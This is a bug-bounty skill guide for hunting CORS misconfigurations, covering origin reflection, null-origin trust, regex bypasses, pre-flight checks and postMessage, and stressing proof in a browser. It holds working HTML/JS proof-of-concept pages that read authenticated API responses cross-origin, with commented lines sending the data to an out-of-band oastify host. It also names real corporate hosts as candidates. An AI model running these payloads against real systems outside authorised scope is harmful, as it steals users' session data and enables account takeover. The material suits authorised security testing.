---
name: hunt-cors
description: "Hunt CORS Misconfiguration — origin-reflection with credentials, null-origin trust, subdomain-regex bypass (unanchored vs unescaped-dot vs prefix-only), pre-flight (OPTIONS) gating bypass, postMessage origin checks. High only when an attacker-controlled origin can perform a CREDENTIALED cross-origin read of sensitive data and you have proven it in a browser. Use when testing API endpoints, SPAs, or any app emitting Access-Control-* headers."
---
---

# HUNT-CORS — Cross-Origin Resource Sharing Misconfiguration

## What actually pays (and what does not)

CORS pays High **only** when an attacker-controlled origin can perform a
**credentialed** cross-origin read of sensitive authenticated data, and you
have a browser PoC proving the response body is readable from `evil.com`.

Two hard browser rules that kill most "findings" — check these FIRST:

- **`Access-Control-Allow-Origin: *` CANNOT be combined with credentials.**
  If the server returns `ACAO: *`, the browser refuses to send/expose the
  response for a `credentials: include` request. A wildcard-only endpoint is
  **not** credential-exploitable. It is only interesting if the data it serves
  is sensitive *without* a session (rare) — usually this is Informational/Low.
- **`Access-Control-Allow-Credentials: true` is meaningless on its own.** It
  matters only if `ACAO` reflects/allows your specific attacker origin AND a
  cross-origin credentialed `fetch` actually returns a readable body. ACAC on a
  response that does not reflect your origin proves nothing.

If you cannot demonstrate a readable cross-origin authed body in a real
browser, you do not have a High. Do not submit header-diffing alone.

---

## Crown Jewel Targets

- **Reflect-any-origin + credentials** — server echoes the `Origin` header AND
  sets `ACAC: true` → any site reads authed API responses. The classic High.
- **Null-origin trust** — `ACAO: null` + `ACAC: true`. A `sandbox` iframe (or a
  `data:`/redirect chain) emits `Origin: null`, so any page can read authed data.
- **Subdomain-regex bypass** — trusted-origin regex with a parsing flaw. The
  correct payload depends on *which* flaw (see Phase 3 — this is where most
  skills get it wrong).
- **Subdomain takeover → trusted origin** — a dangling subdomain that the CORS
  policy trusts; take it over, host the PoC there (see hunt-subdomain).
- **postMessage missing/loose origin check** — handler that processes
  `event.data` without strictly validating `event.origin`.

---

## Attack Surface Signals

```
Any endpoint returning an Access-Control-Allow-Origin header
API endpoints:   /api/*, /v1/*, /graphql
Profile/account: /api/me, /api/profile, /api/user, /api/session
Secrets/tokens:  /api/tokens, /api/keys, /api/csrf, /api/account/settings
Financial:       /api/balance, /api/transactions
Admin/internal:  /api/admin/*, /api/internal/*
```

Prioritize endpoints that (a) require a session cookie and (b) return PII,
tokens, CSRF tokens, or other secrets in the body.

---

## Step-by-Step Hunting Methodology

### Phase 1 — Discover CORS endpoints
```bash
# Probe API endpoints. Use GET (not -I): some servers only emit CORS on GET,
# and -I sends HEAD which may be handled differently.
while read url; do
  result=$(curl -s -D - -o /dev/null "$url" \
    -H "Origin: https://evil.com" \
    -H "Cookie: $SESSION_COOKIE" | grep -i "access-control")
  [ -n "$result" ] && echo "=== $url ===" && echo "$result"
done < recon/$TARGET/api-endpoints.txt

# httpx bulk check
cat recon/$TARGET/live-hosts.txt | awk '{print $1}' | \
  httpx -H "Origin: https://evil.com" -match-string "access-control-allow-origin"
```

### Phase 2 — Reflect-any-origin + null origin
```bash
# Does the server reflect an arbitrary Origin back?
curl -s -D - -o /dev/null https://$TARGET/api/me \
  -H "Origin: https://evil.com" \
  -H "Cookie: $SESSION_COOKIE" | grep -i "access-control"

# Vulnerable (the High case):
#   Access-Control-Allow-Origin: https://evil.com   <- reflects attacker origin
#   Access-Control-Allow-Credentials: true          <- + credentials => readable
#
# NOT exploitable for credentialed theft:
#   Access-Control-Allow-Origin: *                   <- browser blocks creds read
#   (no ACAC, or ACAC absent)                        <- not credentialed

# Null-origin trust
curl -s -D - -o /dev/null https://$TARGET/api/me \
  -H "Origin: null" \
  -H "Cookie: $SESSION_COOKIE" | grep -i "access-control"
# Looking for:  Access-Control-Allow-Origin: null  +  ACAC: true
```

### Phase 3 — Subdomain / trusted-origin regex bypass
The right payload depends on **which** regex flaw the server has. Identify the
class first, then send the matching payload. Getting this wrong wastes the test
and produces false negatives.

| Server regex (intended: trust `*.target.com`) | Flaw | Bypass origin that matches | Why |
|---|---|---|---|
| `^https?://.*\.target\.com$` | **None** — escaped dot + end-anchor. Correct. | (no simple bypass) | `evil.target.com` is in-scope by design; `x.target.com.evil.com` ENDS in `.evil.com`, fails `$`. Move on or look for subdomain-takeover. |
| `^https?://.*target\.com$` | **Missing dot separator** (no `\.` before `target`) | `https://eviltarget.com` | `.*target\.com$` matches `eviltarget.com` — attacker registers `eviltarget.com`. |
| `^https?://.*\.target\.com` | **Missing end-anchor `$`** | `https://x.target.com.evil.com` | regex matches a prefix; `.target.com` appears, then `.evil.com` is ignored (no `$`). |
| `^https?://target\.com` | **Prefix-only, no `$`** | `https://target.com.evil.com` | matches the `target.com` prefix; the rest is unconstrained. |
| `^https?://.*\.target\.com$` but dot in regex is **unescaped** (`.*.target.com$`) | **Unescaped dot** = "any char" | `https://xtargetXcom...` style, or `https://evilZtargetZcom` where `Z` is any single char | `.` matches any character, widening the match. |
| Any of the above | **Special chars browsers send in Origin** | `https://target.com%60.evil.com`, `https://target.com\x60evil.com` | some parsers treat backtick/underscore as letters; Safari/older browsers may emit unusual origins. Confirm the browser actually sends it. |

```bash
# Send each class-specific payload and watch what the server reflects.
for ORIGIN in \
  "https://evil.target.com" \
  "https://eviltarget.com" \
  "https://x.target.com.evil.com" \
  "https://target.com.evil.com" \
  "https://target.com%60.evil.com" \
  "http://target.com"; do
  RESULT=$(curl -s -D - -o /dev/null "https://$TARGET/api/me" \
    -H "Origin: $ORIGIN" \
    -H "Cookie: $SESSION_COOKIE" | grep -i "access-control")
  echo "[$ORIGIN] -> ${RESULT:-no CORS}"
done
```
A bypass is real only if the server reflects **your registerable origin** into
`ACAO` with `ACAC: true`. `evil.target.com` reflecting back is NOT a bug unless
you can actually control a `*.target.com` host (then see Phase 6 / hunt-subdomain).

### Phase 4 — Pre-flight (OPTIONS) gating bypass
Non-simple requests (custom headers, `PUT`/`DELETE`/`PATCH`, non-simple
`Content-Type`) trigger a CORS **pre-flight** `OPTIONS`. The browser only sends
the real request if the pre-flight response authorizes the method/header. Two
things to test:

1. **Does the pre-flight authorize arbitrary methods/headers for your origin?**
   If `Access-Control-Allow-Methods` / `Access-Control-Allow-Headers` reflect
   whatever you ask for, a malicious origin can drive state-changing requests
   (chain to CSRF-style writes that JSON/SameSite would otherwise block).

```bash
curl -s -D - -o /dev/null -X OPTIONS "https://$TARGET/api/account/email" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: x-custom-auth, content-type" \
  | grep -i "access-control"
# Vulnerable: ACAO reflects evil.com + ACAC:true +
#   Access-Control-Allow-Methods: PUT  +  Access-Control-Allow-Headers: x-custom-auth
# => attacker origin can issue authed PUT/DELETE with custom headers.
```

2. **Is the pre-flight even enforced server-side?** Some servers reflect the
   origin on `OPTIONS` but the actual GET/POST also reflects — the read path is
   the bug; the pre-flight just confirms write-path reach. Test the GET/POST
   directly too — never assume the pre-flight result equals the real-request
   result. Confirm in a browser, because curl ignores CORS entirely.

### Phase 5 — Browser PoCs (the only thing that proves impact)
curl does NOT enforce CORS — it will happily show you a reflected header even
when a browser would block the read. **Every CORS High needs a browser PoC.**

**5a. Reflect-any-origin read** (host on evil.com, open while logged into target):
```html
<!doctype html><body><pre id="out"></pre>
<script>
fetch("https://TARGET/api/me", {credentials: "include"})
  .then(r => r.text())
  .then(d => {
    document.getElementById("out").innerText = d;        // prove readable body
    // OOB proof: fetch("https://OOB-ID.oastify.com/?d="+encodeURIComponent(d));
  })
  .catch(e => document.getElementById("out").innerText = "BLOCKED: " + e);
</script></body>
```
If you see `BLOCKED` / a TypeError, the browser refused the read — it is NOT a
valid finding regardless of what curl showed (this is the `ACAO: *` + creds case).

**5b. Null-origin read** — a `sandbox` iframe sends `Origin: null`. The inner
document must lack `allow-same-origin` so its origin is opaque (`null`):
```html
<!doctype html><body>
<!-- Outer page hosted anywhere -->
<iframe sandbox="allow-scripts" srcdoc='
  <script>
    fetch("https://TARGET/api/me", {credentials: "include"})
      .then(r => r.text())
      .then(d => parent.postMessage(d, "*"));
  &lt;/script&gt;'></iframe>
<script>
window.addEventListener("message", e => {
  // d is the authed body, read cross-origin via a null Origin
  // fetch("https://OOB-ID.oastify.com/?d="+encodeURIComponent(e.data));
  console.log("NULL-ORIGIN READ:", e.data);
});
</script></body>
```
(Alternative null-origin emitters: a `data:` / `blob:` document, or bouncing the
request through a 302 redirect chain whose final hop is cross-scheme.)

**5c. Trusted-subdomain read** — once you control a host that the regex trusts
(real subdomain via takeover, or a registerable origin that matches a buggy
regex from Phase 3), host **5a** there. The reflected origin is now an origin
you legitimately serve, so the browser allows the read.

### Phase 6 — postMessage origin check
```bash
# Find message handlers that don't strictly validate event.origin.
grep -rEn "addEventListener\(['\"]message" recon/$TARGET/ --include="*.js" \
  | grep -v "\.origin"
# Then audit each hit: does it check event.origin against an allowlist
# BEFORE using event.data? Weak checks to flag:
#   .indexOf("target.com") > -1      <- "target.com.evil.com" passes
#   .endsWith("target.com")          <- "eviltarget.com" passes
#   startsWith("https://target")     <- "https://target.evil.com" passes
#   no check at all
```
postMessage is a separate class from HTTP CORS — impact is DOM-side (XSS,
client-side auth bypass). See hunt-dom for exploitation depth.

---

## Automation (triage only — never the proof)
```bash
# corsy — fast reflection/null/pre-domain checks
pip3 install corsy
corsy -u https://$TARGET -t 10 --headers "Cookie: $SESSION_COOKIE"

# nuclei CORS templates
nuclei -u https://$TARGET -t http/misconfiguration/cors/

# Burp: passively flags origin reflection; always re-confirm in a real browser.
```
Every automated hit is a lead, not a finding. Reproduce 5a/5b in a browser.

---

## Chain Table

| CORS finding | Chain to | Impact |
|---|---|---|
| Reflects attacker origin + creds | Browser-read `/api/me`, `/api/tokens`, `/api/csrf` | PII + token + CSRF-token theft → often ATO |
| Reflects origin + reads CSRF token | hunt-csrf: steal token → forge state change | CSRF on CSRF-protected forms |
| Pre-flight allows arbitrary method/header | Drive authed `PUT`/`DELETE` from evil origin | Cross-origin state change |
| Trusted subdomain has XSS | hunt-xss → run 5a from trusted origin | Reliable credentialed read |
| Dangling trusted subdomain | hunt-subdomain takeover → host 5c there | Full credentialed read |
| postMessage no/loose origin check | hunt-dom: inject iframe, send crafted message | DOM XSS / client auth bypass |

---

## Validation discipline (read before submitting)

- **Browser proof mandatory.** curl reflecting a header is NOT exploitation.
  Show a screenshot/console log of the authed body read from `evil.com`. If the
  fetch throws / logs `BLOCKED`, you have nothing.
- **`ACAO: *` + credentials = not a finding.** Browsers block it. Only pursue
  wildcard if the data is sensitive unauthenticated (then it is usually Low).
- **`ACAC: true` alone proves nothing** — it must pair with your reflected
  origin AND a successful readable cross-origin body.
- **Match the regex class to the payload (Phase 3).** Do not submit
  `target.com.evil.com` against an end-anchored escaped-dot regex — it does not
  match and is not a bug.
- **`evil.target.com` reflecting is not automatically a bug** — it is an
  in-scope subdomain by design unless you can actually control it.
- **OOB confirmation** for blind/headless contexts: exfil the read body to a
  Burp Collaborator / oastify host and show the interaction. Use a unique
  per-test marker so the hit is unambiguously yours.
- **Sensitive data requirement.** A readable `/api/health` is not High. Tie the
  read to PII, tokens, secrets, or financial data to justify severity.

**Severity:**
- Reflects attacker origin + creds + sensitive body, browser-proven: High
- Pre-flight authorizes attacker-origin state change on sensitive action: High
- Null-origin + sensitive authed body, browser-proven: Medium–High
- Subdomain-takeover/XSS-assisted credentialed read: High/Critical
- Reflects origin, no credentials / non-sensitive: Low–Informational
- `ACAO: *` only (no creds possible): Informational unless data is secret

---

## A CORS MISCONFIGURATION NEEDS A BODY TO BE A FINDING

`Access-Control-Allow-Origin: <whatever was sent>` plus
`Access-Control-Allow-Credentials: true` is the classic shape, and one
request confirms it. It is NOT yet a finding, because CORS only matters
if a RESPONSE BODY is readable cross-origin.

The measurement that decides it, in order:
  1. THE NEGATIVE CONTROL. Send the request with NO `Origin` header. If
     the ACAO header is still there, it is a static header, not a
     reflection, and the "misconfiguration" is much weaker. If it is
     absent, the origin IS being reflected.
  2. THE REFLECTION UNIVERSALITY. Send several unrelated origins, plus
     `null`, plus a subdomain of a known attacker domain, plus the
     attacker domain with a prefix. All reflected = no allow-list.
  3. THE CREDENTIAL TEST, with a BOGUS credential. The question is
     whether the server's BEHAVIOUR changes when a credential is
     PRESENT - not whether a real credential would work. If a bogus
     cookie or bearer changes the status, the host is real and the
     finding is live. If every shape returns the same refusal, the
     host sits behind a WAF and the impact is unproven.
  4. THE BROWSER. `fetch()` from a different origin with
     `credentials: 'include'`, and read `r.type`. `type: "cors"` with a
     readable body means the read is permitted; `type: "opaque"` means
     the browser blocked it and the header is cosmetic.

THE VERDICT RULE THAT MATTERS: if every response is a WAF-generated
refusal page, the honest verdict is "a real misconfiguration with NO
PROVEN IMPACT" - a note, not a report. Record the exact ceiling
measured, and list what would change the verdict.

## AN EDGE 403 IS NOT THE APPLICATION'S ANSWER

When the refusal page is an Akamai `errors.edgesuite.net` page with a
reference number, the application behind it was never reached. Do not
write "the endpoint returns 403" as if the application refused it.
Write "the edge refused it before the application", because that is a
different claim and it is the one that bounds the impact. A static
`/favicon.ico` that answers 200 while all 51 other paths answer 403
tells you the host is a real application behind an edge - and it is
still not a finding without a body worth reading.

## A 200 IS NOT A HIT WHEN THE BODY IS A SIGN-IN PAGE

A Cloudflare Access gate answers **HTTP 200** with the sign-in page
for EVERY path, on EVERY host it covers. A sweep that records "status
200" therefore reports a whole fleet of "reachable" hosts that are
not reachable at all. The discriminator is the BODY, not the status:

```python
bodies = {}
for p in paths:
    st, b = get(host + p)
    bodies.setdefault(hash(b), []).append(p)
# a real router produces MANY distinct bodies
# a gated host produces exactly ONE
```

A second tell: a gated host sets `CF_Session` and `Set-Cookie:
CF_Access`, and its body contains the app's name in the `<title>`.
Check `"Cloudflare Access" in body` before believing any 200.

**The same shape appears in WAF interstitials**: Imperva, Akamai and
Cloudflare all answer 403/200 with a branded page whose text says
"Request Blocked" and, in Cloudflare's case, prints the client's own
IP address. Those pages are not the application, and a 200 from them
proves nothing.

**An `ACAO: *` sweep across a large host set is cheap and worth
doing**, because it is one header probe per host. But the result that
survives the skill's own rules is: reflection is what matters, and
`ACAO: *` with an EMPTY body is not even Informational. Check the
body length before you write a line about it.

## PROVE THE BROWSER REFUSES, DO NOT ASSUME IT

When a host sends `ACAO: *` together with `ACAC: true`, the skill
says a browser must reject the credentialed read. That is a rule you
can MEASURE in two lines from the browser harness, and measuring it
turns an assumption into a fact:

```js
fetch(host, {credentials: 'include', mode: 'cors'})
  .then(r => 'ALLOWED ' + r.status)
  .catch(e => 'BLOCKED ' + e.constructor.name)   // TypeError: Failed to fetch
```

`BLOCKED` is the proof that there is no finding. `ALLOWED` with a
readable body would be the proof that there is. Run it; do not cite
the rule as if it were the measurement.

### Two traps that make the browser test lie

**Trap 1 — the page you are standing on may not be the target.** A
WAF interstitial is served on an opaque origin: `location.origin` is
`null` and `document.title` is the block page's name. From there EVERY
fetch throws `TypeError: Failed to fetch`, including
`mode:'no-cors'`. A test that concludes "the browser blocked the
credentialed read" is then proving nothing — the request never left.
Check `location.origin` and `document.title` BEFORE the test, and
require a positive control: a fetch of a KNOWN-GOOD cross-origin URL
that must resolve and return bytes. Only if the control returns a body
may a later `BLOCKED` be attributed to CORS.

**Trap 2 — `openssl x509` without `-in` silently produces nothing.**
Piping `s_client`'s stdout into `openssl x509` on stdin yields EMPTY
output. Empty output read as "the hostname matches" inverted the
verdict for every host in a fleet. Write the PEM to a file, then:

```bash
openssl s_client -connect "$H:443" -servername "$H" </dev/null 2>/dev/null \
  | sed -n '/BEGIN CERTIFICATE/,/END CERTIFICATE/p' > /tmp/c.pem
openssl x509 -in /tmp/c.pem -noout -checkhost "$H"
# "Hostname <h> does NOT match certificate"
```

The verdict string contains a capital `NOT`; compare it
case-insensitively or it reads as a match. A host whose certificate
does not cover its own name is refused by a default browser BEFORE
any CORS logic runs, so check the certificate before spending browser
time on the CORS policy.

### Sweep EVERY ACAO host, not just the wildcard ones

When a header archive hands you N hosts that emit `Access-Control-Allow-Origin`,
the tempting move is to test the ones whose archived value is a bare `*`,
because those look "Critical". That is backwards. A bare `*` is a *static*
value by definition — it cannot reflect, so it is dead before you test it.

The hosts worth spending requests on are the ones whose archived ACAO is an
**explicit origin** (`https://tdm.dell.com`, `https://us1.wymanagementsuite.com`)
paired with `ACAC: true`. Those are the only ones that *could* be echoing the
request's `Origin` back — which is the actual vulnerability. On one 65-host set
the split was: 7 wildcard (all inert) versus **17 credential-bearing
static-looking hosts (the real candidates)**, and the wildcard-first instinct
would have measured only the dead 7.

Method: one request per credential-bearing host with a canary `Origin`, and
classify the response:

```
ACAO echoes the canary + ACAC true   -> EXPLOITABLE (browser-prove it)
ACAO stays its hard-coded value      -> static allow-list, CLOSED
ACAO absent for a foreign origin     -> correctly scoped, CLOSED
ACAO names localhost / 127.0.0.1     -> dev-config leak, NOT remotely
                                        exploitable (an attacker cannot
                                        serve from the victim's localhost)
```

The `localhost` value is the one that reads like a finding and is not: record
it as a hardening note. Also record whether the credential-bearing hosts answer
**403** — a CORS header riding on a WAF deny page is inert twice over (no
reflection, and no body to read even if there were).

### A wildcard-plus-credentials host is usually inert TWICE over

The `ACAO: *` + `ACAC: true` combination is the classic "Critical"
CORS finding on paper. In practice it fails for two independent
reasons, and you should check BOTH:

1. The Fetch spec refuses the credentialed read (measure it).
2. The body is empty. Every path returns 403 with 0 bytes. A header
   over an empty body is worth nothing even if the browser allowed the
   read. Measure the body BEFORE the header, never after.

Also sweep the API SUB-PATHS, not just the root. CORS is a per-ROUTE
policy and it is common for the API middleware to set the headers
while the static handler does not. On a 90-host set, 37 API-shaped
paths x 6 origins is ~20k cheap GETs and it is the only way to see
the difference.
